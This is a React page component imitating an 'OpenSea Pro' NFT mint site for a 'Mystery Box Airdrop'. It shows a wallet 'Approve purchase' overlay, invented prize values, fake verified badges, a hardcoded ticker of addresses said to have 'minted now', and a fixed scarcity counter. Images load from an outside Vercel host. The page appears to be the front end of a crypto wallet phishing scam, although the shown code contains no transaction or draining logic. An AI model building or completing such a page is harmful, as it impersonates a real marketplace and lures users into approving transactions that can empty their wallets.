export default function HomePage() {
  return (
    <>
      {/* Overlay alert */}
      <div className="alert">
        <div className="alert_window">
          <div className="alert_lable">
            <div className="alert_text">Approve purchase</div>
            <button className="alert_btn interact-button" aria-label="Close alert">
              ✕
            </button>
          </div>
          <div className="alert_items">
            {[1, 2, 3].map((n) => (
              <div className="alert_item" key={n}>
                <div className="item_img">
                  <img
                    src="https://mysterybox-mints002.vercel.app/load%202.html"
                    className="alert_loader"
                    alt="Loading"
                  />
                  <img
                    src={`https://mysterybox-mints002.vercel.app/${n}.html`}
                    className="alert_logo"
                    alt={`Item ${n}`}
                  />
                </div>
                <div className="item_desc">
                  <div className="item_lable">1 item</div>
                  <div className="item_chain">Chain: Ethereum</div>
                </div>
              </div>
            ))}
          </div>
          <div className="alert_line" />
          <div className="alert_comment">
            <div className="alert_comment_lable">Go to your wallet</div>
            <div className="alert_comment_desc">
              You’ll be asked to approve this purchase from your wallet
            </div>
          </div>
        </div>
      </div>

      {/* Header */}
      <header>
        <div className="logo_head">
          <div className="logo_img">
            <img src="/boath_png.png" alt="OpenSeaPro" />
          </div>
          <span className="logo_text">
            <span className="logo_text_main">OpenSea</span>
            <span className="logo_text_pro">Pro</span>
          </span>
        </div>
        <div className="inputs_head">
          <div className="searche">
            <div className="magnifying">🔍</div>
            <div className="inputs_head_inner">
              <input
                type="text"
                placeholder="Search items, collections, and accounts"
              />
            </div>
            <div className="slash">
              <span>/</span>
            </div>
          </div>
          <div className="connect">
            <button className="connect_btn interact-button">
              <span>MINT NOW</span>
            </button>
            <a className="user interact-button" aria-label="User">
              👤
            </a>
            <button className="basket interact-button" aria-label="Cart">
              🛒
            </button>
          </div>
        </div>
      </header>

      {/* Main hero with video background */}
      <main>
        <div className="main_screen">
          <div className="screen_lable">
            <div className="video">
              <div className="color_tone" />
              <video autoPlay loop playsInline muted>
                <source src="/high.mp4" type="video/mp4" />
              </video>
            </div>
            <div className="screen_lable_content">
              <div className="lable_content_left">
                <div className="lable_screen_logo">
                  <img src="/boath.png" alt="Mystery Box" />
                </div>
                <div className="lable_screen_username">
                  <span>Mystery Box</span>
                  <svg
                    className="verified_icon"
                    width="20"
                    height="20"
                    viewBox="0 0 24 24"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                    aria-hidden="true"
                    focusable="false"
                  >
                    <path d="M12 2.8c.7 0 1.3.3 1.8.8l.6.6.8-.3c.7-.2 1.4 0 1.9.5l.6.6.9-.1c.7-.1 1.3.2 1.7.8.3.5.4 1.1.2 1.7l-.3.8.6.6c.5.5.7 1.2.5 1.9l-.3.8.6.6c.5.5.6 1.3.3 2-.3.6-.9 1-1.6 1l-.9.1-.3.8c-.2.7-.8 1.2-1.5 1.4l-.8.3-.6.6c-.5.5-1.3.7-2 .4l-.8-.3-.6.6c-.5.5-1.3.7-2 .4l-.8-.3-.6.6c-.5.5-1.3.6-2 .3-.6-.3-1-.9-1.1-1.6l-.1-.9-.8-.3c-.7-.2-1.2-.8-1.4-1.5l-.3-.8-.6-.6c-.5-.5-.7-1.3-.4-2l.3-.8-.6-.6c-.5-.5-.7-1.3-.4-2l.3-.8-.6-.6c-.5-.5-.6-1.3-.3-2 .3-.6.9-1 1.6-1.1l.9-.1.3-.8c.2-.7.8-1.2 1.5-1.4l.8-.3.6-.6c.5-.5 1.1-.8 1.8-.8z" stroke="#FFFFFF" stroke-width="1.5" fill="none"/>
                    <circle cx="12" cy="12" r="6.5" fill="#FFFFFF" />
                    <path d="M9.5 12.2l-1.3-1.3a1 1 0 10-1.4 1.4l2 2a1 1 0 001.4 0l4.7-4.7a1 1 0 10-1.4-1.4l-4 4z" fill="#FFFFFF" stroke="#0D0D0D" stroke-width="0.4" />
                  </svg>
                </div>
                <div className="lable_owner">
                  <span>By</span>
                  <span className="hover">OpenSeaPro</span>
                  <svg
                    className="verified_icon"
                    width="18"
                    height="18"
                    viewBox="0 0 24 24"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                    aria-hidden="true"
                    focusable="false"
                  >
                    <path d="M12 2.8c.7 0 1.3.3 1.8.8l.6.6.8-.3c.7-.2 1.4 0 1.9.5l.6.6.9-.1c.7-.1 1.3.2 1.7.8.3.5.4 1.1.2 1.7l-.3.8.6.6c.5.5.7 1.2.5 1.9l-.3.8.6.6c.5.5.6 1.3.3 2-.3.6-.9 1-1.6 1l-.9.1-.3.8c-.2.7-.8 1.2-1.5 1.4l-.8.3-.6.6c-.5.5-1.3.7-2 .4l-.8-.3-.6.6c-.5.5-1.3.7-2 .4l-.8-.3-.6.6c-.5.5-1.3.6-2 .3-.6-.3-1-.9-1.1-1.6l-.1-.9-.8-.3c-.7-.2-1.2-.8-1.4-1.5l-.3-.8-.6-.6c-.5-.5-.7-1.3-.4-2l.3-.8-.6-.6c-.5-.5-.7-1.3-.4-2l.3-.8-.6-.6c-.5-.5-.6-1.3-.3-2 .3-.6.9-1 1.6-1.1l.9-.1.3-.8c.2-.7.8-1.2 1.5-1.4l.8-.3.6-.6c.5-.5 1.1-.8 1.8-.8z" stroke="#FFFFFF" stroke-width="1.5" fill="none"/>
                    <circle cx="12" cy="12" r="6.3" fill="#FFFFFF" />
                    <path d="M9.5 12.2l-1.3-1.3a1 1 0 10-1.4 1.4l2 2a1 1 0 001.4 0l4.7-4.7a1 1 0 10-1.4-1.4l-4 4z" fill="#FFFFFF" stroke="#0D0D0D" stroke-width="0.4" />
                  </svg>
                </div>
                <div className="lable_miting">
                  <div className="lable_dot">
                    <div className="amin" />
                    <div className="statick" />
                  </div>
                  <div className="lable_btn">MINTING NOW</div>
                </div>
              </div>
              <div className="lable_content_right">
                <div className="content_right" />
              </div>
            </div>
          </div>
        </div>

        {/* Ticker */}
        <div className="ticker-wrapper">
          <div className="ticker" id="newsTicker">
            <span>0x6d3b4b…a9e8 minted now</span>
            <span>0x3f3e71…05e9 minted now</span>
            <span>0x7b32f6…f2f1 minted now</span>
            <span>0x12ab9c…77de minted now</span>
            <span>0x98ff10…0aa4 minted now</span>
            <span>0xbeef42…cafe minted now</span>
            <span>0x5c1e7a…9b33 minted now</span>
            <span>0xd4f8aa…11ce minted now</span>
            <span>0x0a73ef…5b88 minted now</span>
            <span>0x3ac29d…e70f minted now</span>
            {/* duplicate for seamless loop */}
            <span>0x6d3b4b…a9e8 minted now</span>
            <span>0x3f3e71…05e9 minted now</span>
            <span>0x7b32f6…f2f1 minted now</span>
            <span>0x12ab9c…77de minted now</span>
            <span>0x98ff10…0aa4 minted now</span>
            <span>0xbeef42…cafe minted now</span>
            <span>0x5c1e7a…9b33 minted now</span>
            <span>0xd4f8aa…11ce minted now</span>
            <span>0x0a73ef…5b88 minted now</span>
            <span>0x3ac29d…e70f minted now</span>
          </div>
        </div>

        {/* Main content */}
        <div className="main_content">
          <div className="tabs">
            <div className="tab1">Mint</div>
          </div>
          <div className="row" />
          <div className="about_content">
            <div className="main_user">
              <div className="about">
                <div className="about_lable">
                  <h2>About this collection</h2>
                </div>
                <div className="about_user">
                  <div className="lable_content_logo">
                    <img src="/boath_png.png" alt="logo" />
                  </div>
                  <div className="lable_content_author">
                    <div className="content_author_username">
                      <span>Gemesis</span>
                      <svg
                        className="verified_icon"
                        width="18"
                        height="18"
                        viewBox="0 0 24 24"
                        fill="none"
                        xmlns="http://www.w3.org/2000/svg"
                        aria-hidden="true"
                        focusable="false"
                      >
                        <circle cx="12" cy="12" r="10" fill="#1D9BF0" />
                        <path
                          d="M10.2 13.6l-1.8-1.8a1 1 0 10-1.4 1.4l2.5 2.5a1 1 0 001.5-.1l5.5-6a1 1 0 10-1.5-1.3l-4.8 5.3z"
                          fill="#ffffff"
                        />
                      </svg>
                    </div>
                    <div className="content_author_coin">
                      <span>Ethereum</span>
                    </div>
                  </div>
                </div>
                <div className="about_description">
                  <p>
                    <strong>
                      🎉 New Mystery Box Airdrop – Only 150 Boxes Available
                    </strong>
                    <br /> The next wave of NFT utility is here.
                    <br /> We’re launching a limited Mystery Box Airdrop built
                    for NFT power users.
                    <br /> Each box unlocks exclusive OpenSea Pro–level
                    rewards, with NFT values ranging from $3,000 to $250,000 in
                    historical OpenSea collections.
                    <br /> 🧠 Months in the making — this drop honors active
                    collectors, traders, and early supporters.
                  </p>
                  <br />
                  <h3>🎁 Claim Rules:</h3>
                  <ul className="claim_rules">
                    <li>Only 150 Mystery Boxes available</li>
                    <li>1 Box per wallet — no exceptions</li>
                    <li>Available for a limited time or until fully claimed</li>
                    <li>✅ Smart contract verified</li>
                    <li>🔒 Claim is on-chain, secure, and trackable</li>
                  </ul>
                  <p>
                    Don’t miss your chance to pull rare assets from top-tier
                    NFT vaults.
                    <br />
                    👉 Tap “Mint Now” to connect your wallet and secure your
                    box. Good luck, collector.
                  </p>
                  <br />
                  <a target="_blank" className="interact-button">
                    View on Etherscan
                  </a>
                </div>
              </div>
            </div>
            <div className="stat">
              <div className="stat_row">
                <div className="stat_nums">
                  <div className="stat_nums_left">
                    <span>49.5% minted</span>
                  </div>
                  <div className="stat_nums_right">
                    <span>73 / 150</span>
                  </div>
                </div>
                <div className="stat_line">
                  <div className="stat_line_left" />
                  <div className="stat_line_right" />
                </div>
              </div>
              <div className="counter">
                <div className="counter_lable">Community</div>
                <div className="counter_amount">0 ETH</div>
                <div className="counter_input">
                  <div className="counter_input_count">
                    <div className="minus">-</div>
                    <div className="int">1</div>
                    <div className="plus">+</div>
                  </div>
                  <div
                    className="connectButton mint interact-button"
                    id="messageButton"
                  >
                    <a className="interact-button">Mint</a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Footer (simplified) */}
      <footer>
        <div className="first_row">
          <div className="first_row_left">
            <div className="row_left_lable">Stay in the loop</div>
            <div className="row_left_desc">
              Join our mailing list to stay in the loop with our newest
              feature releases, NFT drops, and tips and tricks for navigating
              OpenSea.
            </div>
            <div className="row_left_input">
              <div className="left_input">
                <input type="text" placeholder="Your email address" />
              </div>
              <div className="left_btn">Sign up</div>
            </div>
          </div>
          <div className="first_row_right">
            <div className="row_left_lable">Join the community</div>
            <div className="row_links">
              <div className="content_right">
                <div className="links">
                  <a className="icon interact-button" aria-label="Discord" target="_blank" href="#">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path d="M20.317 4.369A18.244 18.244 0 0016.558 3c-.2.353-.43.83-.59 1.205a16.388 16.388 0 00-4-.001c-.16-.376-.39-.853-.59-1.206a18.27 18.27 0 00-3.76 1.37C3.95 7.26 3.3 10.03 3.5 12.76c1.41 1.05 2.78 1.69 4.11 2.11.33-.46.62-.95.87-1.46-.48-.18-.94-.41-1.37-.67.11-.08.22-.17.33-.25 2.64 1.24 5.5 1.24 8.13 0 .11.09.22.17.33.25-.43.26-.89.49-1.37.67.25.51.55 1 .88 1.46 1.33-.42 2.7-1.06 4.11-2.11.34-4.27-.73-6.99-2.06-8.39zM9.58 12.5c-.66 0-1.2-.6-1.2-1.33 0-.73.53-1.33 1.2-1.33.66 0 1.2.6 1.2 1.33 0 .73-.53 1.33-1.2 1.33zm4.84 0c-.66 0-1.2-.6-1.2-1.33 0-.73.53-1.33 1.2-1.33.66 0 1.2.6 1.2 1.33 0 .73-.53 1.33-1.2 1.33z" fill="#FFFFFF"/>
                    </svg>
                  </a>
                  <a className="icon interact-button" aria-label="Twitter" target="_blank" href="#">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path d="M22 5.92c-.77.34-1.6.57-2.47.67a4.21 4.21 0 001.84-2.32 8.4 8.4 0 01-2.67 1.02A4.19 4.19 0 0015.3 4c-2.33 0-4.22 1.9-4.22 4.24 0 .33.03.65.1.96A11.9 11.9 0 013 5.14a4.26 4.26 0 001.31 5.66c-.64-.02-1.24-.2-1.76-.5v.05c0 2.05 1.45 3.76 3.37 4.15-.35.1-.72.16-1.1.16-.27 0-.53-.03-.78-.08.53 1.67 2.07 2.87 3.9 2.9A8.42 8.42 0 012 19.54a11.9 11.9 0 006.44 1.89c7.73 0 11.95-6.42 11.95-11.98 0-.18 0-.35-.01-.53A8.6 8.6 0 0022 5.92z" fill="#FFFFFF"/>
                    </svg>
                  </a>
                  <a className="icon interact-button" aria-label="Telegram" target="_blank" href="#">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path d="M9.03 13.44l-.36 5.09c.51 0 .73-.22 1-.48l2.4-2.3 4.98 3.66c.91.5 1.57.24 1.82-.84l3.3-14.66h0c.29-1.27-.46-1.77-1.35-1.46L1.66 9.5c-1.26.49-1.24 1.2-.21 1.52l4.93 1.53 11.46-7.23c.54-.33 1.03-.15.62.18L9.03 13.44z" fill="#FFFFFF"/>
                    </svg>
                  </a>
                  <a className="icon interact-button" aria-label="Instagram" target="_blank" href="#">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path d="M7 2h10a5 5 0 015 5v10a5 5 0 01-5 5H7a5 5 0 01-5-5V7a5 5 0 015-5zm5 5a5 5 0 100 10 5 5 0 000-10zm6-1.2a1.2 1.2 0 100 2.4 1.2 1.2 0 000-2.4zM12 9a3 3 0 110 6 3 3 0 010-6z" fill="#FFFFFF"/>
                    </svg>
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </footer>

      {/* Mint modal */}
      <div id="mintModal" className="modal" style={{ zIndex: 998 }}>
       
      </div>
    </>
  );
}
